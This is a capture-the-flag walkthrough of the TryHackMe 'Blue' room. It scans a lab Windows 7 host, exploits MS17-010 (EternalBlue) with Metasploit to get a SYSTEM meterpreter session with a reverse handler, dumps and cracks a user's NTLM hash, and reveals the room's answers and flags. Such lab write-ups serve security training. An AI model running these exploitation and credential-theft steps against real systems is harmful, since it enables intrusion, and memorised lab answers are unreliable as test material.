# Eternal Blue

<div align="left">

<figure><img src=".gitbook/assets/7717bbc69c486931e503a74f3192a4d8.gif" alt="" width="130"><figcaption><p>tryhackme.com - © TryHackMe</p></figcaption></figure>

</div>

🔗 [Blue](https://tryhackme.com/room/blue)

### Task 1 Reconnaissance - Deploy the machine

### 1.1 - Deploy the machine

🎯 Target IP: `10.10.33.26`

Create a directory for machine on the Desktop and a directory containing the scans with nmap.

```bash
su
echo "10.10.33.26 blue.thm" >> /etc/hosts

mkdir thm/blue
cd thm/blue

# At the end of the room
# To clean up the last line from the /etc/hosts file
sed -i '$ d' /etc/hosts
```

I prefer to start recon by pinging the target, this allows us to check connectivity and get OS info.

```bash
ping -c 3 blue.thm
```

```bash
PING blue.thm (10.10.33.26) 56(84) bytes of data.
64 bytes from blue.thm (10.10.33.26): icmp_seq=1 ttl=127 time=73.9 ms
64 bytes from blue.thm (10.10.33.26): icmp_seq=2 ttl=127 time=70.3 ms
64 bytes from blue.thm (10.10.33.26): icmp_seq=3 ttl=127 time=75.1 ms
```

Sending these three ICMP packets, we see that the Time To Live (TTL) is \~128 secs. this indicates that the target is a windows system, while \*nix systems usually have a TTL of 64 secs.

#### 1.2 - How many services are running under port 1000?

```bash
nmap -p1-1000 --open -sS -n -Pn blue.thm -oG open_ports
```

```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-05 19:35 CEST
Nmap scan report for blue.thm (10.10.33.26)
Host is up (0.069s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

> 3 ports open under port 1000

#### 1.3 - What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)

```bash
nmap -p135,139,445 -sV -sC -vvv -n -Pn blue.thm
```

```bash
PORT    STATE SERVICE      REASON          VERSION
135/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds syn-ack ttl 127 Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 39544/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 58246/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 23738/udp): CLEAN (Timeout)
|   Check 4 (port 12563/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-06-05T12:36:48-05:00
| smb2-security-mode: 
|   210: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-06-05T17:36:48
|_  start_date: 2023-06-05T17:02:02
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 0243a7b722e5 (unknown)
| Names:
|   JON-PC<00>           Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   JON-PC<20>           Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| Statistics:
|   0243a7b722e50000000000000000000000
|   0000000000000000000000000000000000
|_  0000000000000000000000000000

```

This is an important info:

```bash
445/tcp open  microsoft-ds syn-ack ttl 127 Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
```

Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010) [https://www.exploit-db.com/exploits/42315](https://www.exploit-db.com/exploits/42315) or we can find it with searchsploit (CLI).

> MS17-010

### Task 2 - Gain Access

#### 2.1 - Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)

Start Metasploit

```bash
msfconsole -q
```

```bash
msf6 > search ms17-010
```

```bash
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution

```

> exploit/windows/smb/ms17\_010\_eternalblue

2.2 - Show options and set the one required value. What is the name of this value? (All caps for submission)

> RHOSTS

2.3 - Exploit the machine and gain a foothold.

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOST blue.thm
RHOST => blue.thm
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.9.80.228
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
```

<figure><img src=".gitbook/assets/Schermata del 2023-06-05 21-49-23.png" alt=""><figcaption></figcaption></figure>

### Task 3 - Escalate 

#### 3.1 - Convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > search shell_to_meterpreter
```

```bash
Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade
   
```

#### 3.2 - Select this (use MODULE\_PATH). Show options, what option are we required to change?

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > use 0
msf6 post(multi/manage/shell_to_meterpreter) > sessions

Active sessions
===============

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.9.80.228:4444 -> 10.10.37.188:49211 (10.10.37.188)

msf6 post(multi/manage/shell_to_meterpreter) > set SESSION 2
SESSION => 2
msf6 post(multi/manage/shell_to_meterpreter) > run

```

```bash
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.9.80.228:4433 
[*] Post module execution completed
```

```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

```bash
meterpreter > ps
```

<figure><img src=".gitbook/assets/Schermata del 2023-06-05 22-25-45.png" alt=""><figcaption></figcaption></figure>

#### 3.3 - Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again.

```bash
meterpreter > migrate 1068
[*] Migrating from 1364 to 1068...
[*] Migration completed successfully.
meterpreter > migrate 1704
[*] Migrating from 1068 to 1704...
meterpreter > migrate 1688
[*] Migrating from 1068 to 1688...
[*] Migration completed successfully.
```

### Task 4 - Cracking

#### 4.1 - Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?&#x20;

<figure><img src=".gitbook/assets/Schermata del 2023-06-05 22-33-23.png" alt=""><figcaption></figcaption></figure>

> Jon

#### 4.2 - Copy this password hash to a file and research how to crack it. What is the cracked password?

```bash
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

```bash
echo 'ffb43f0de35be4d9917ac0cc8ad57f8d' > jon_hash.txt
```

We copy this hash and crack it using John The Ripper while using rockyou.txt wordlist.

```bash
john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt jon_hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
alqfna22         (?)     
1g 0:00:00:00 DONE (2023-06-05 22:39) 1.369g/s 13973Kp/s 13973Kc/s 13973KC/s alr19882006..alpusidi
```

Jon's credentials are `jon`:`alqfna22`

> alqfna22

### Task 5 - Find flags!

#### 5.1 - Flag1? _This flag can be found at the system root._&#x20;

As we have a meterpreter shell we could search for a file on the system.

We start by changing our directory to C:/ (root of system). We find the flag1.txt in the system root.

```bash
cd C:\\
dir
cat flag1.txt
```

<details>

<summary>🚩Reveal Flag1</summary>

flag{access\_the\_machine}

</details>

#### 5.2 - Flag2? _This flag can be found at the location where passwords are stored within Windows._

Check directories by using the “dir” command. Then I see the flag1.txt file.

```bash
cd C:/Windows/System32/config
cat flag2.txt
```

<details>

<summary>🚩Reveal Flag2</summary>

flag{sam\_database\_elevated\_access}

</details>

#### 5.3 - Flag3? _This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved._&#x20;

```bash
meterpreter > search -f flag3.txt
```

After that you see the flag3.txt file, Then read it.

<details>

<summary>🚩Reveal Flag3</summary>

flag{admin\_documents\_can\_be\_valuable}

</details>
